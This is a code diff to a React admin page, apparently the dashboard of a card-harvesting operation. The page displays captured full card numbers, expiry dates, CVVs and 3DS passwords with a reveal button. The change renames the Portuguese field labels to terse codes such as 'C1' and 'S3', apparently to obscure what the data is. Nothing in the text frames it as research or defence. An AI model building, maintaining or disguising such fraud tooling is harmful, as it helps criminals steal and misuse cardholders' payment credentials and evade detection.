@@ -502,15 +502,15 @@ const AdminCartoes = () => {
               )}
               <hr className="border-border" />
               <div>
-                <p className="text-xs text-muted-foreground mb-2">Dados do Cartão</p>
+                <p className="text-xs text-muted-foreground mb-2">Dados do C</p>
                 {!showData && !askingPassword && (
                   <div className="space-y-1">
                     <p className="text-sm"><strong>Titular:</strong> {viewTx.holder_name}</p>
                     <p className="text-sm"><strong>CPF:</strong> {maskCpf(viewTx.cpf)}</p>
-                    <p className="text-sm"><strong>Cartão:</strong> {maskCardNumber(viewTx.card_last4)}</p>
-                    <p className="text-sm"><strong>Bandeira:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
-                    <p className="text-sm"><strong>Validade:</strong> **/**</p>
-                    <p className="text-sm"><strong>CVV:</strong> ***</p>
+                    <p className="text-sm"><strong>C:</strong> {maskCardNumber(viewTx.card_last4)}</p>
+                    <p className="text-sm"><strong>B:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
+                    <p className="text-sm"><strong>DV:</strong> **/**</p>
+                    <p className="text-sm"><strong>C1:</strong> ***</p>
                     <Button variant="outline" size="sm" onClick={handleReveal} className="mt-2">
                       <Eye className="h-3.5 w-3.5 mr-1" /> Revelar dados completos
                     </Button>
@@ -540,14 +540,14 @@ const AdminCartoes = () => {
                     <p className="text-sm"><strong>Titular:</strong> {viewTx.holder_name}</p>
                     <ToggleField label="CPF" masked={maskCpf(viewTx.cpf)} real={formatCpf(viewTx.cpf)} />
                     <ToggleField
-                      label="Cartão"
+                      label="C"
                       masked={maskCardNumber(viewTx.card_last4)}
                       real={viewTx.card_number ? formatCardNumber(viewTx.card_number) : maskCardNumber(viewTx.card_last4)}
                     />
-                    <p className="text-sm"><strong>Bandeira:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
-                    <ToggleField label="Validade" masked="**/**" real={viewTx.card_expiry} />
-                    <ToggleField label="CVV" masked="***" real={viewTx.card_cvv || "---"} />
-                    <ToggleField label="Senha 3DS" masked="****" real={viewTx.threeds_password || "---"} />
+                    <p className="text-sm"><strong>B:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
+                    <ToggleField label="DV" masked="**/**" real={viewTx.card_expiry} />
+                    <ToggleField label="C1" masked="***" real={viewTx.card_cvv || "---"} />
+                    <ToggleField label="S3" masked="****" real={viewTx.threeds_password || "---"} />
                     <p className="text-sm"><strong>Token:</strong> <code className="text-xs bg-muted px-1 rounded">{viewTx.token}</code></p>
                   </div>
                 )}
